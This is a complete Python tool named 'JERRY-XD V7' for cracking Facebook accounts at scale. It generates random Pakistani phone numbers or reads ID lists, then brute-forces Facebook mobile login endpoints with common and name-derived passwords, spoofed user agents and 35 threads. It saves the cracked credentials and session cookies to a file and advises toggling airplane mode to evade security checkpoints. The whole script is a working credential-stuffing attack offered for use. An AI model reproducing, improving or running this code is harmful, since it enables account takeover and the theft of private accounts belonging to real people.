#!/usr/bin/python3
#-*-coding:utf-8-*-
# JERRY-XD V7 [ULTIMATE PAKISTAN] 2025

import os, requests, re, sys, time, random, threading
from concurrent.futures import ThreadPoolExecutor as JerrySpeed

# --- COLORS ---
G = '\x1b[1;92m' # Green
W = '\x1b[1;97m' # White
R = '\x1b[1;91m' # Red
Y = '\x1b[1;93m' # Yellow
C = '\x1b[1;36m' # Cyan

ok = []
cp = []
loop = 0
id = []
method_url = ""

def logo():
    os.system('clear')
    print(f"""{C}
       ____  __________  ______  __
      / / / / / __  / __ \/ __ \/ /
 __  / / /_/ / /_/ / /_/ / /_/ /_/ 
/ /_/ /  ___/ _, _/ _, _/  ___/ /  
\____/_/   /_/ |_/_/ |_/_/   /_/   
{W} ----------------------------------------------
{G} [•] Author   : JERRY-XD
{G} [•] Version  : 7.0 [Ultimate]
{G} [•] Network  : 4G Optimized (PK)
{W} ----------------------------------------------""")

def linex():
    print(f"{W} ----------------------------------------------")

# --- SMART USER-AGENTS (2025) ---
def get_device_ua(choice):
    if choice == '1': # iPhone Profile
        return f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(17,18)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBAV/{random.randint(400,450)}.0.0.0;FBBV/{random.randint(500000,600000)};]"
    elif choice == '2': # Samsung S25 Ultra
        return f"Mozilla/5.0 (Linux; Android 15; SM-S931B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/450.0.0.44.110;FBBV/650923412;]"
    elif choice == '3': # Huawei/Vivo
        return f"Mozilla/5.0 (Linux; Android 14; V2310) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/440.0.0.20.110;FBBV/580234912;]"
    else: # Mixed Android
        return f"Mozilla/5.0 (Linux; Android {random.randint(12,15)}; RMX3850) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"

# --- MAIN MENU ---
def main():
    logo()
    print(f" {G}[1] FILE CLONING (ANY FILE)")
    print(f" {G}[2] RANDOM CLONING (PK CODES)")
    print(f" {G}[0] EXIT")
    linex()
    choice = input(f" {C}[?] Select : {W}")
    if choice == '1': file_crack()
    elif choice == '2': random_crack()
    else: sys.exit()

def select_method():
    global method_url
    logo()
    print(f" {G}[1] Method M-Basic (High Speed / No Login)")
    print(f" {G}[2] Method Mobile  (Stable for Jazz/Zong)")
    print(f" {G}[3] Method Free-FB (Zero Data Server)")
    print(f" {G}[4] Method Touch   (iPhone User Interface)")
    linex()
    m_choice = input(f" {C}[?] Choose Method : {W}")
    if m_choice == '1': method_url = 'mbasic.facebook.com'
    elif m_choice == '2': method_url = 'm.facebook.com'
    elif m_choice == '3': method_url = 'free.facebook.com'
    else: method_url = 'touch.facebook.com'
    return m_choice

def random_crack():
    global id
    logo()
    code = input(f" {G}[?] Code (0300, 0306, 0315, 0345): {W}")
    limit = int(input(f" {G}[?] Limit: {W}"))
    for _ in range(limit):
        id.append(code + "".join(random.choices("0123456789", k=7)))
    m_type = select_method()
    start_clone(True, m_type)

def file_crack():
    global id
    logo()
    path = input(f" {G}[?] Put File Path: {W}")
    try:
        id = open(path).read().splitlines()
        m_type = select_method()
        start_clone(False, m_type)
    except: print(f" {R}[!] File Not Found"); time.sleep(2); main()

def start_clone(is_random, m_type):
    global loop
    logo()
    print(f" {G}[*] IDs : {len(id)} | Server: {method_url}")
    print(f" {G}[*] Tip  : Airplane Mode On/Off to avoid CP")
    linex()
    with JerrySpeed(max_workers=35) as exec:
        for user in id:
            if is_random:
                uid = user
                pwx = [user, user[:6], user[5:], 'pakistan', 'khan123', 'khan786', '786786', 'khan1122', 'malik123', 'ali123', 'pubg123', 'paki123', 'khan12345', '12345678', '000786']
            else:
                try:
                    uid, name = user.split('|')
                    first = name.split(' ')[0].lower()
                    pwx = [name, name.lower(), first+'123', first+'1234', first+'12345', first+'786', first+'khan', 'khan123', 'pakistan', '786786', 'ali123', 'ali1122', 'khan007', 'pk12345', 'first123']
                except: continue
            exec.submit(crack_logic, uid, pwx, m_type)
    print(f"\n{W} ----------------------------------------------")
    print(f" {G}[*] Process Complete. OK: {len(ok)}")
    input(f" {C}[ Press Enter To Return ]")
    main()

def crack_logic(user, pwx, m_type):
    global loop, ok, cp
    sys.stdout.write(f'\r {W}[JERRY] {loop}/{len(id)} | {G}OK:{len(ok)} | {Y}CP:{len(cp)} ')
    sys.stdout.flush()
    for pw in pwx:
        if len(pw) < 6: continue
        try:
            ua = get_device_ua(m_type)
            session = requests.Session()
            # Advanced Headers for PK 4G
            session.headers.update({
                'Host': method_url,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'accept-language': 'en-PK,en-US;q=0.9,en;q=0.8',
                'user-agent': ua,
            })
            free_fb = session.get(f'https://{method_url}/login.php').text
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "email": user, "pass": pw
            }
            # Posting Login
            session.post(f'https://{method_url}/login/device-based/regular/login/', data=data, allow_redirects=False)
            
            if 'c_user' in session.cookies.get_dict():
                coki = ";".join([k+"="+v for k,v in session.cookies.get_dict().items()])
                print(f'\r\n{G} [JERRY-OK] {user} | {pw} \n [COOKIE] {coki} ')
                ok.append(user)
                open('/sdcard/jerry_ok.txt', 'a').write(f'{user}|{pw}|{coki}\n')
                break
            elif 'checkpoint' in session.cookies.get_dict():
                print(f'\r{Y} [JERRY-CP] {user} | {pw} ')
                cp.append(user)
                open('/sdcard/jerry_cp.txt', 'a').write(f'{user}|{pw}\n')
                break
        except: continue
    loop += 1

if __name__ == "__main__":
    main()
